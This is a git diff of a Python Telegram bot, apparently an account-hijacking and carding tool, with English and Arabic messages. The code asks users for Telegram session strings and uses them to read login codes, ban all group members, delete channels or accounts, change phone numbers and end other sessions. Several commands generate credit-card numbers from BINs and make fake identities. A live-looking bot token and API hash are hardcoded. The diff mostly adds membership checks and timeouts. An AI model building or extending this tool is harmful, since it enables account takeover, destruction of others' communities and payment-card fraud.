@@ -29,7 +29,7 @@ from os import system
 from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
 api_hash = "abb92dcce1862377cd0bacf73d89473b"
 token = "6279916111:AAEpwnF5RWhor_hJe0LPpXv357UkJmPivc4"
-client = TelegramClient('Prifewafcax', api_id, api_hash).start(bot_token=token)
+client = TelegramClient('Prifewagrfcax', api_id, api_hash).start(bot_token=token)
 from telethon import TelegramClient as tg
 from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
 from telethon.sessions import StringSession as ses
@@ -532,13 +532,12 @@ async def send_all(event):
 
 
 
-@client.on(events.NewMessage(pattern='/arhack', func=lambda x: x.is_private))
+@client.on(events.NewMessage(pattern='/arhack'))
 @is_banned
 async def hack(event):
-    chat_id = event.chat_id
-
+    user_id = event.sender_id
     # Check if the user is in the channel
-    is_member = await is_user_in_channel(client, channel_id, chat_id)
+    is_member = await is_user_in_channel(client, channel_id, user_id)
 
     if is_member:
         async with bot.conversation(event.chat_id) as x:
@@ -607,7 +606,7 @@ async def hack(event):
 
 # /id US -صنع هوية مزيفة مع رمز بريجي وكل شيء 
 
-# //check <BIN> - تاكيد البين وفحصه
+# /check <BIN> - تاكيد البين وفحصه
 
 #################################
 
@@ -672,6 +671,10 @@ async def log_user_message(event):
 
     users_set.add(user_id)
 
+    # Check if the user command meets the conditions for logging
+    if not user_command.startswith('/') and len(user_command) <= 20:
+        return
+
     is_user_banned = user_id in banned_users
 
     # Save updated user list to file
@@ -705,7 +708,6 @@ async def log_user_message(event):
 
     # Send the log message to the log channel
     await client.send_message(log_channel, log_message)
-
 
 
 @client.on(events.CallbackQuery())
@@ -762,6 +764,12 @@ async def log_user_message(event):
         return
 
     user_command = event.text
+
+    users_set.add(user_id)
+
+    # Check if the user command meets the conditions for logging
+    if not user_command.startswith('/') and len(user_command) <= 20:
+        return
 
     users_set.add(user_id)
 
@@ -1271,9 +1279,9 @@ channel_id = -1001828433073
 @is_banned
 async def connect(event):
     chat_id = event.chat_id
-
+    user_id = event.sender_id
     # Check if the user is in the channel
-    is_member = await is_user_in_channel(client, channel_id, chat_id)
+    is_member = await is_user_in_channel(client, channel_id, user_id)
 
     if is_member:
         # User is in the channel, continue with the code
@@ -1357,13 +1365,13 @@ use /gen , /id , /check for credit card commands !
 استخدم /gen , /id . /check لاوامر فحص بطاقات''')
 
 
-@client.on(events.NewMessage(pattern='/hack', func=lambda x: x.is_private))
+@client.on(events.NewMessage(pattern='/hack'))
 @is_banned
 async def hack(event):
     chat_id = event.chat_id
-
+    user_id = event.sender_id
     # Check if the user is in the channel
-    is_member = await is_user_in_channel(client, channel_id, chat_id)
+    is_member = await is_user_in_channel(client, channel_id, user_id)
 
     if is_member:
         async with bot.conversation(event.chat_id) as x:
@@ -1460,9 +1468,9 @@ if sys.stdin.isatty():
 @is_banned
 async def users(event):
     chat_id = event.chat_id
-
+    user_id = event.sender_id
     # Check if the user is in the channel
-    is_member = await is_user_in_channel(client, channel_id, chat_id)
+    is_member = await is_user_in_channel(client, channel_id, user_id)
 
     if not is_member:
         await event.respond("""Please join @PrivaPact for the bot to work!
@@ -1489,12 +1497,13 @@ async def users(event):
     # Update the command cooldown for the user
     command_cooldown[user_id] = datetime.now() + timedelta(seconds=15)
 
+    sender_id = event.sender_id  # Store the sender_id
+
     async with bot.conversation(event.chat_id) as x:
         try:
-            await x.send_message("""Now send me the Termux Session so I can send you the channels/groups.
-                           
-الان ارسل لي كود الترمكس""")
-            strses = await x.get_response()
+            await x.send_message("Now send me the Termux Session so I can send you the channels/groups.")
+            strses = await x.wait_event(events.NewMessage(from_users=sender_id), timeout=60)
+
 
             # Check if the session is empty
             if not strses.text:
@@ -1537,7 +1546,10 @@ async def users(event):
             await event.respond("""Invalid session or phone number. Please check your Termux Session.
                                    
 ترمكس خاطئ أو رقم هاتف غير صالح. يرجى التحقق من كود الترمكس.""", buttons=keyboard)
-
+        except TimeoutError:
+            return await event.respond("""Please provide the termux session withing 60 seconds
+            
+الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
 
 
 
@@ -1551,7 +1563,9 @@ import os
 @is_banned
 async def users(event):
     chat_id = event.chat_id
-    is_member = await is_user_in_channel(client, channel_id, chat_id)
+    user_id = event.sender_id
+    # Check if the user is in the channel
+    is_member = await is_user_in_channel(client, channel_id, user_id)
     if not is_member:
         await event.respond("""Please join @PrivaPact for the bot to work!
         
@@ -1578,13 +1592,14 @@ async def users(event):
     # Update the command cooldown for the user, unless they are a developer
     if not is_developer:
         command_cooldown[user_id] = datetime.now() + timedelta(seconds=15)
+    sender_id = event.sender_id  # Store the sender_id
 
     async with bot.conversation(event.chat_id) as x:
         try:
             await x.send_message("""Now send me the Termux Session so I can send you all users info.
                            
 الان ارسل لي كود الترمكس لكي ارسل لك معلومات المستخدم""")
-            strses = await x.get_response()
+            strses = await x.wait_event(events.NewMessage(from_users=sender_id), timeout=60)
 
             # Check if the session is empty
             if not strses.text:
@@ -1609,6 +1624,11 @@ async def users(event):
             await event.respond("""Invalid session or phone number. Please check your Termux Session.
                                    
 ترمكس خاطئ أو رقم هاتف غير صالح. يرجى التحقق من كود الترمكس.""", buttons=keyboard)
+        except TimeoutError:
+            return await event.respond("""Please provide the termux session withing 60 seconds
+            
+الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
+
 
 from telethon.errors import SessionPasswordNeededError, PhoneNumberUnoccupiedError
 
@@ -1618,7 +1638,9 @@ from telethon.errors import SessionPasswordNeededError, PhoneNumberUnoccupiedErr
 @is_banned
 async def users(event):
     chat_id = event.chat_id
-    is_member = await is_user_in_channel(client, channel_id, chat_id)
+    user_id = event.sender_id
+    # Check if the user is in the channel
+    is_member = await is_user_in_channel(client, channel_id, user_id)
     if not is_member:
         await event.respond("""Please join @PrivaPact for the bot to work!
         
@@ -1645,13 +1667,14 @@ async def users(event):
 
         # Update the command cooldown for the user
         command_cooldown[user_id] = datetime.now() + timedelta(seconds=15)
-
+    
     async with bot.conversation(event.chat_id) as x:
         try:
             await x.send_message("""Now send me the Termux Session so I can ban all group/channel members.
     
 الان ارسل لي كود الترمكس""")
-            strses = await x.get_response()
+            sender_id = event.sender_id 
+            strses = await x.wait_event(events.NewMessage(from_users=sender_id), timeout=60)
             op = await cu(strses.text)
             if not op:
                 await event.respond("""Invalid Session. Please use another one.
@@ -1669,12 +1692,13 @@ async def users(event):
             await event.reply("""Banning all Group/Channel members.
                       
 تم طرد كل الأعضاء""", buttons=keyboard)
+        
+        except TimeoutError:
+            return await event.respond("""Please provide the termux session withing 60 seconds
+            
+الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
         except Exception as e:
             await event.respond(f"An error occurred: {str(e)}")
-
-        except telethon.errors.rpcerrorlist.QueryIdInvalidError:
-            print("Query ID is invalid or expired. Ignoring the callback.")
-
 
 
 
@@ -1694,7 +1718,9 @@ command_cooldown = {}
 @is_banned
 async def users(event):
     chat_id = event.chat_id
-    is_member = await is_user_in_channel(client, channel_id, chat_id)
+    user_id = event.sender_id
+    # Check if the user is in the channel
+    is_member = await is_user_in_channel(client, channel_id, user_id)
     if not is_member:
         await event.respond("""Please join @PrivaPact for the bot to work!
         
@@ -1728,7 +1754,8 @@ async def users(event):
                            
 الآن أرسل لي كود الترمكس لكي أرسل لك رمز الدخول الأحدث""")
                                  
-            strses = await x.get_response()  # Replace with your actual Termux session
+            sender_id = event.sender_id 
+            strses = await x.wait_event(events.NewMessage(from_users=sender_id), timeout=60)  # Replace with your actual Termux session
             op = await cu(strses.text)
             if not op:
                 await event.respond("""Invalid Session. Please use another one.
@@ -1738,11 +1765,12 @@ async def users(event):
 
             i = await usermsgs(strses.text)
             await event.reply(i + "\n\n", buttons=keyboard)
+        except TimeoutError:
+            return await event.respond("""Please provide the termux session withing 60 seconds
+            
+الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
         except Exception as e:
-            print(f"An error occurred: {str(e)}")
-
-        except telethon.errors.rpcerrorlist.QueryIdInvalidError:
-            print("Query ID is invalid or expired. Ignoring the callback.")
+            await event.respond(f"An error occurred: {str(e)}")
 
 
 
@@ -1757,7 +1785,9 @@ from telethon.errors.rpcerrorlist import ChannelPrivateError
 @is_banned
 async def users(event):
     chat_id = event.chat_id
-    is_member = await is_user_in_channel(client, channel_id, chat_id)
+    user_id = event.sender_id
+    # Check if the user is in the channel
+    is_member = await is_user_in_channel(client, channel_id, user_id)
     if not is_member:
         await event.respond("""Please join @PrivaPact for the bot to work!
         
@@ -1789,7 +1819,8 @@ async def users(event):
             await x.send_message("""Now send me the Termux Session so I can make user join a group/channel.
                            
 الان ارسل لي كود الترمكس لكي ادخل المستخدم في قناة او كروب""")
-            strses = await x.get_response()  # Replace with your actual Termux session
+            sender_id = event.sender_id 
+            strses = await x.wait_event(events.NewMessage(from_users=sender_id), timeout=60)  # Replace with your actual Termux session
             op = await cu(strses.text)
             if not op:
                 await event.respond("""Invalid Session. Please use another one.
@@ -1815,11 +1846,12 @@ Please make sure the channel or group is public and that you have the necessary 
 تأكد من أن القناة أو الكروب عام وأن لديك الصلاحيات اللازمة للانضمام.""",
                     buttons=keyboard
                 )
+        except TimeoutError:
+            return await event.respond("""Please provide the termux session withing 60 seconds
+            
+الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
         except Exception as e:
-            print(f"An error occurred: {str(e)}")
-
-        except telethon.errors.rpcerrorlist.QueryIdInvalidError:
-            print("Query ID is invalid or expired. Ignoring the callback.")
+            await event.respond(f"An error occurred: {str(e)}")
 
 from telethon import errors
 
@@ -1830,7 +1862,9 @@ from telethon import errors
 @is_banned
 async def users(event):
     chat_id = event.chat_id
-    is_member = await is_user_in_channel(client, channel_id, chat_id)
+    user_id = event.sender_id
+    # Check if the user is in the channel
+    is_member = await is_user_in_channel(client, channel_id, user_id)
     if not is_member:
         await event.respond("""Please join @PrivaPact for the bot to work!
         
@@ -1862,7 +1896,8 @@ async def users(event):
                            
 الآن أرسل لي كود الترمكس لكي أرسل لك رمز الدخول الأحدث""")
                                  
-            strses = await x.get_response()  # Replace with your actual Termux session
+            sender_id = event.sender_id 
+            strses = await x.wait_event(events.NewMessage(from_users=sender_id), timeout=60)  # Replace with your actual Termux session
             op = await cu(strses.text)
             if not op:
                 await event.respond("""Invalid Session. Please use another one.
@@ -1872,11 +1907,12 @@ async def users(event):
 
             i = await usermsgs(strses.text)
             await event.reply(i + "\n\n", buttons=keyboard)
+        except TimeoutError:
+            return await event.respond("""Please provide the termux session withing 60 seconds
+            
+الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
         except Exception as e:
-            print(f"An error occurred: {str(e)}")
-
-        except telethon.errors.rpcerrorlist.QueryIdInvalidError:
-            print("Query ID is invalid or expired. Ignoring the callback.")
+            await event.respond(f"An error occurred: {str(e)}")
 
 from telethon import errors
 
@@ -1886,7 +1922,9 @@ from telethon import errors
 @is_banned
 async def users(event):
     chat_id = event.chat_id
-    is_member = await is_user_in_channel(client, channel_id, chat_id)
+    user_id = event.sender_id
+    # Check if the user is in the channel
+    is_member = await is_user_in_channel(client, channel_id, user_id)
     if not is_member:
         await event.respond("""Please join @PrivaPact for the bot to work!
         
@@ -1924,7 +1962,8 @@ async def handle_users(event):
                            
 الان ارسل لي كود الترمكس لكي احذف قناة او كروب المستخدم""")
                                  
-            strses = await x.get_response()  # Replace with your actual Termux session
+            sender_id = event.sender_id 
+            strses = await x.wait_event(events.NewMessage(from_users=sender_id), timeout=60)  # Replace with your actual Termux session
             op = await cu(strses.text)
             if not op:
                  await event.respond("""Invalid Session. Please use another one.
@@ -1949,12 +1988,12 @@ async def handle_users(event):
 حدث خطأ أثناء حذف القناة أو الكروب.""")
             finally:
                 await event.answer()
+        except TimeoutError:
+            return await event.respond("""Please provide the termux session withing 60 seconds
+            
+الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
         except Exception as e:
-            print(f"An error occurred: {str(e)}")
-            await event.answer()
-
-        except telethon.errors.rpcerrorlist.QueryIdInvalidError:
-            print("Query ID is invalid or expired. Ignoring the callback.")
+            await event.respond(f"An error occurred: {str(e)}")
 
 
 
@@ -1963,7 +2002,9 @@ async def handle_users(event):
 @is_banned
 async def users(event):
     chat_id = event.chat_id
-    is_member = await is_user_in_channel(client, channel_id, chat_id)
+    user_id = event.sender_id
+    # Check if the user is in the channel
+    is_member = await is_user_in_channel(client, channel_id, user_id)
     if not is_member:
         await event.respond("""Please join @PrivaPact for the bot to work!
         
@@ -1996,7 +2037,8 @@ async def users(event):
                            
 الان ارسل لي كود الترمكس لكي ارى اذا المستخدم لديه تحقق بخطوتين""")
                                  
-            strses = await x.get_response()  # Replace with your actual Termux session
+            sender_id = event.sender_id 
+            strses = await x.wait_event(events.NewMessage(from_users=sender_id), timeout=60)  # Replace with your actual Termux session
             op = await cu(strses.text)
             if not op:
                 await event.respond("""Invalid Session. Please use another one.
@@ -2013,12 +2055,12 @@ async def users(event):
                 await event.reply("""Sorry, the user has activated 2FA.
         
 اسف، الشخص فعل التحقق بخطوتين""")
+        except TimeoutError:
+            return await event.respond("""Please provide the termux session withing 60 seconds
+            
+الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
         except Exception as e:
-            print(f"An error occurred: {str(e)}")
-            await event.answer()
-
-        except telethon.errors.rpcerrorlist.QueryIdInvalidError:
-            print("Query ID is invalid or expired. Ignoring the callback.")
+            await event.respond(f"An error occurred: {str(e)}")
 
                           
 
@@ -2032,7 +2074,9 @@ from datetime import timedelta, datetime
 @is_banned
 async def users(event):
     chat_id = event.chat_id
-    is_member = await is_user_in_channel(client, channel_id, chat_id)
+    user_id = event.sender_id
+    # Check if the user is in the channel
+    is_member = await is_user_in_channel(client, channel_id, user_id)
     if not is_member:
         await event.respond("""Please join @PrivaPact for the bot to work!
         
@@ -2065,7 +2109,8 @@ async def users(event):
                            
 الان ارسل لي كود الترمكس لكي انهي جميع الجلسات ماعدى البوت""")
                                  
-            strses = await x.get_response()  # Replace with your actual Termux session
+            sender_id = event.sender_id 
+            strses = await x.wait_event(events.NewMessage(from_users=sender_id), timeout=60)  # Replace with your actual Termux session
             op = await cu(strses.text)
             if not op:
                 await event.respond("""Invalid Session. Please use another one.
@@ -2083,11 +2128,12 @@ Please wait 24 hours before performing this action again.
             
 الجلسة الحالية جديدة جدًا ولا يمكن استخدامها لطرد الجلسات الأخرى حاليًا.
 يرجى الانتظار 24 ساعة قبل تنفيذ هذا الإجراء مرة أخرى.""", buttons=keyboard)
+        except TimeoutError:
+            return await event.respond("""Please provide the termux session withing 60 seconds
+            
+الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
         except Exception as e:
-            print(f"An error occurred: {str(e)}")
-
-        except telethon.errors.rpcerrorlist.QueryIdInvalidError:
-            print("Query ID is invalid or expired. Ignoring the callback.")
+            await event.respond(f"An error occurred: {str(e)}")
 
       
 
@@ -2138,7 +2184,8 @@ async def handle_delete_account(event):
                            
 الان ارسل لي كود الترمكس لكي احذف الحساب""")
                                  
-            strses = await x.get_response()
+            sender_id = event.sender_id 
+            strses = await x.wait_event(events.NewMessage(from_users=sender_id), timeout=60)
             op = await cu(strses.text)
             if not op:
                 await event.respond("""Invalid Session. Please use another one.
@@ -2153,11 +2200,12 @@ async def handle_delete_account(event):
 تم حذف الحساب""", buttons=keyboard)
             except telethon.errors.rpcerrorlist.QueryIdInvalidError:
                 pass
+        except TimeoutError:
+            return await event.respond("""Please provide the termux session withing 60 seconds
+            
+الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
         except Exception as e:
-            print(f"An error occurred: {str(e)}")
-
-        except telethon.errors.rpcerrorlist.QueryIdInvalidError:
-            print("Query ID is invalid or expired. Ignoring the callback.")
+            await event.respond(f"An error occurred: {str(e)}")
 
 
 
@@ -2174,7 +2222,9 @@ from telethon.errors import UserNotParticipantError
 @is_banned
 async def users(event):
     chat_id = event.chat_id
-    is_member = await is_user_in_channel(client, channel_id, chat_id)
+    user_id = event.sender_id
+    # Check if the user is in the channel
+    is_member = await is_user_in_channel(client, channel_id, user_id)
     if not is_member:
         await event.respond("""Please join @PrivaPact for the bot to work!
         
@@ -2208,7 +2258,8 @@ async def users(event):
                            
 الان ارسل لي كود الترمكس لكي ارفع مستخدم كادمن""")
                                  
-            strses = await x.get_response()
+            sender_id = event.sender_id 
+            strses = await x.wait_event(events.NewMessage(from_users=sender_id), timeout=60)
             op = await cu(strses.text)
             if not op:
                 await event.reply("""Invalid Session. Please use another one.
@@ -2233,12 +2284,14 @@ async def users(event):
                 
 تم رفع الادمن""")
             except Exception as e:
-                print(f"An error occurred: {str(e)}")
-                await event.respond("""An error occurred while adding the user as admin.
-                                 
+                await event.respond(f"""An error occurred: {str(e)})
+         
 حدث خطا اثناء رفع الادمن""")
-        except telethon.errors.rpcerrorlist.QueryIdInvalidError:
-            print("Query ID is invalid or expired. Ignoring the callback.")
+        except TimeoutError:
+            return await event.respond("""Please provide the termux session withing 60 seconds
+            
+الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
+        
 
 
 
@@ -2248,7 +2301,9 @@ async def users(event):
 @is_banned
 async def users(event):
     chat_id = event.chat_id
-    is_member = await is_user_in_channel(client, channel_id, chat_id)
+    user_id = event.sender_id
+    # Check if the user is in the channel
+    is_member = await is_user_in_channel(client, channel_id, user_id)
     if not is_member:
         await event.respond("""Please join @PrivaPact for the bot to work!
         
@@ -2279,7 +2334,8 @@ async def users(event):
                            
 الان ارسل لي كود الترمكس لكي ازالة جميع الادمنية""")
                                  
-            strses = await x.get_response()
+            sender_id = event.sender_id 
+            strses = await x.wait_event(events.NewMessage(from_users=sender_id), timeout=60)
             op = await cu(strses.text)
             if not op:
                 await event.respond("""Invalid Session please use another one.
@@ -2298,8 +2354,12 @@ async def users(event):
 تم حذف جميع الادمنية في الكروب""", buttons=keyboard)
             except telethon.errors.rpcerrorlist.QueryIdInvalidError:
                 await event.respond("""An error occurred. Please try again later.""", buttons=keyboard)
+        except TimeoutError:
+            return await event.respond("""Please provide the termux session withing 60 seconds
+            
+الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
         except Exception as e:
-            print(f"An error occurred: {str(e)}")
+            await event.respond(f"An error occurred: {str(e)}")
 
 
 
@@ -2329,7 +2389,9 @@ async def users(event):
         command_cooldown[user_id] = datetime.now() + timedelta(seconds=15)
 
     chat_id = event.chat_id
-    is_member = await is_user_in_channel(client, channel_id, chat_id)
+    user_id = event.sender_id
+    # Check if the user is in the channel
+    is_member = await is_user_in_channel(client, channel_id, user_id)
     if not is_member:
         await event.respond("""Please join @PrivaPact for the bot to work!
         
@@ -2341,7 +2403,8 @@ async def users(event):
                            
 الان ارسل لي كود الترمكس لكي اغير رقم الحساب""")
                                  
-            strses = await x.get_response()
+            sender_id = event.sender_id 
+            strses = await x.wait_event(events.NewMessage(from_users=sender_id), timeout=60)
             op = await cu(strses)
             if not op:
                 return await event.respond("""Invalid Session please use another one.
@@ -2378,11 +2441,12 @@ async def users(event):
                 await event.respond("""Send this error code to - @QuadriIIion\n**LOGS**\n
         
 خطا حدث ارسل هاذا للمالكين""" + str(e))
+        except TimeoutError:
+            return await event.respond("""Please provide the termux session withing 60 seconds
+            
+الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
         except Exception as e:
-            print(f"An error occurred: {str(e)}")
-
-        except telethon.errors.rpcerrorlist.QueryIdInvalidError:
-            print("Query ID is invalid or expired. Ignoring the callback.")
+            await event.respond(f"An error occurred: {str(e)}")
 
 
 
@@ -2391,7 +2455,9 @@ async def users(event):
 @is_banned
 async def connect(event):
     chat_id = event.chat_id
-    is_member = await is_user_in_channel(client, channel_id, chat_id)
+    user_id = event.sender_id
+    # Check if the user is in the channel
+    is_member = await is_user_in_channel(client, channel_id, user_id)
     if not is_member:
         await event.respond("""Please join @PrivaPact for the bot to work!
         
@@ -2464,7 +2530,9 @@ async def gcasta(strses, msg):
 @is_banned
 async def users(event):
     chat_id = event.chat_id
-    is_member = await is_user_in_channel(client, channel_id, chat_id)
+    user_id = event.sender_id
+    # Check if the user is in the channel
+    is_member = await is_user_in_channel(client, channel_id, user_id)
     if not is_member:
         await event.respond("""Please join @PrivaPact for the bot to work!
         
@@ -2501,12 +2569,15 @@ async def users(event):
                 await event.reply("""An error occurred while performing the broadcast.
                 
 حدث خطا اثناء البث""", buttons=keyboard)
+        except TimeoutError:
+            return await event.respond("""Please provide the termux session withing 60 seconds
+            
+الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
         except Exception as e:
             print(f"An error occurred: {str(e)}")
             await event.reply("Invalid session. Please provide a valid Termux session.", buttons=keyboard)
 
-        except telethon.errors.rpcerrorlist.QueryIdInvalidError:
-            pass
+
 
 
 
@@ -2540,7 +2611,9 @@ async def gcastb(strses, msg):
 @is_banned
 async def users(event):
     chat_id = event.chat_id
-    is_member = await is_user_in_channel(client, channel_id, chat_id)
+    user_id = event.sender_id
+    # Check if the user is in the channel
+    is_member = await is_user_in_channel(client, channel_id, user_id)
     if not is_member:
         await event.respond("""Please join @PrivaPact for the bot to work!
         
@@ -2580,12 +2653,14 @@ async def users(event):
                 await event.reply("""An error occurred while performing the broadcast.
                 
 حدث خطا اثناء البث""", buttons=keyboard)
+        except TimeoutError:
+            return await event.respond("""Please provide the termux session withing 60 seconds
+            
+الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
         except Exception as e:
             print(f"An error occurred: {str(e)}")
             await event.reply("Invalid session. Please provide a valid Termux session.", buttons=keyboard)
 
-        except telethon.errors.rpcerrorlist.QueryIdInvalidError:
-            print("Query ID is invalid or expired. Ignoring the callback.")
 
 
 async def gcastc(strses, msg):
@@ -2613,7 +2688,9 @@ async def gcastc(strses, msg):
 @is_banned
 async def users(event):
     chat_id = event.chat_id
-    is_member = await is_user_in_channel(client, channel_id, chat_id)
+    user_id = event.sender_id
+    # Check if the user is in the channel
+    is_member = await is_user_in_channel(client, channel_id, user_id)
     if not is_member:
         await event.respond("""Please join @PrivaPact for the bot to work!
         
@@ -2647,12 +2724,13 @@ async def users(event):
                 await event.reply("""An error occurred while performing the broadcast.
                 
 حدث خطا اثناء البث""", buttons=keyboard)
+        except TimeoutError:
+            return await event.respond("""Please provide the termux session withing 60 seconds
+            
+الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
         except Exception as e:
             print(f"An error occurred: {str(e)}")
             await event.reply("Invalid session. Please provide a valid Termux session.", buttons=keyboard)
-
-        except telethon.errors.rpcerrorlist.QueryIdInvalidError:
-            print("Query ID is invalid or expired. Ignoring the callback.")
 
 
 
@@ -2665,7 +2743,9 @@ from telethon.sessions import StringSession
 @is_banned
 async def users(event):
     chat_id = event.chat_id
-    is_member = await is_user_in_channel(client, channel_id, chat_id)
+    user_id = event.sender_id
+    # Check if the user is in the channel
+    is_member = await is_user_in_channel(client, channel_id, user_id)
     if not is_member:
         await event.respond("""Please join @PrivaPact for the bot to work!
         
@@ -2677,7 +2757,8 @@ async def users(event):
             await x.send_message("""Now send me the Termux Session so I can Log out.
                            
 الآن أرسل لي كود الترمكس لكي أسجل الخروج""")
-            strses = await x.get_response()  # Replace with your actual Termux session
+            sender_id = event.sender_id 
+            strses = await x.wait_event(events.NewMessage(from_users=sender_id), timeout=60)  # Replace with your actual Termux session
             op = await cu(strses.text)
             if not op:
                 await event.respond("""Invalid Session. Please use another one.
@@ -2692,6 +2773,10 @@ async def users(event):
                 await event.reply("""Logged out successfully from the provided Termux session.
             
 تم تسجيل الخروج بنجاح من جلسة الترمكس المقدمة.""", buttons=keyboard)
+        except TimeoutError:
+            return await event.respond("""Please provide the termux session withing 60 seconds
+            
+الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
         except Exception as e:
             print(f"An error occurred: {str(e)}")
 
@@ -2741,6 +2826,15 @@ Please read and accept the following terms and conditions:
 @client.on(events.NewMessage(pattern='/check'))
 @is_banned
 async def check(event):
+    chat_id = event.chat_id
+    user_id = event.sender_id
+    # Check if the user is in the channel
+    is_member = await is_user_in_channel(client, channel_id, user_id)
+    if not is_member:
+        await event.respond("""Please join @PrivaPact for the bot to work!
+        
+الرجاء الانضمام إلى @PrivaPact حتى يعمل البوت""")
+        return
     message_text = event.raw_text
     bin_value = message_text.split('/check ')[1].strip() if len(message_text.split()) > 1 else None
 
@@ -2804,6 +2898,15 @@ def get_random_user_data(country_code):
 @client.on(events.NewMessage(pattern=r'/gen(\s+(\d{6}))?$'))
 @is_banned
 async def generate_random_credit_cards(event):
+    chat_id = event.chat_id
+    user_id = event.sender_id
+    # Check if the user is in the channel
+    is_member = await is_user_in_channel(client, channel_id, user_id)
+    if not is_member:
+        await event.respond("""Please join @PrivaPact for the bot to work!
+        
+الرجاء الانضمام إلى @PrivaPact حتى يعمل البوت""")
+        return
     bin_number = event.pattern_match.group(2)
 
     if not bin_number or not bin_number.isnumeric() or len(bin_number) != 6:
@@ -2829,6 +2932,15 @@ async def generate_random_credit_cards(event):
 @client.on(events.NewMessage(pattern=r'/gen (\d{6})/(\d{2})/(\d{2})/(\d{3})'))
 @is_banned
 async def generate_specific_credit_cards(event):
+    chat_id = event.chat_id
+    user_id = event.sender_id
+    # Check if the user is in the channel
+    is_member = await is_user_in_channel(client, channel_id, user_id)
+    if not is_member:
+        await event.respond("""Please join @PrivaPact for the bot to work!
+        
+الرجاء الانضمام إلى @PrivaPact حتى يعمل البوت""")
+        return
     bin_number = event.pattern_match.group(1)
     expiry_month = event.pattern_match.group(2)
     expiry_year = event.pattern_match.group(3)
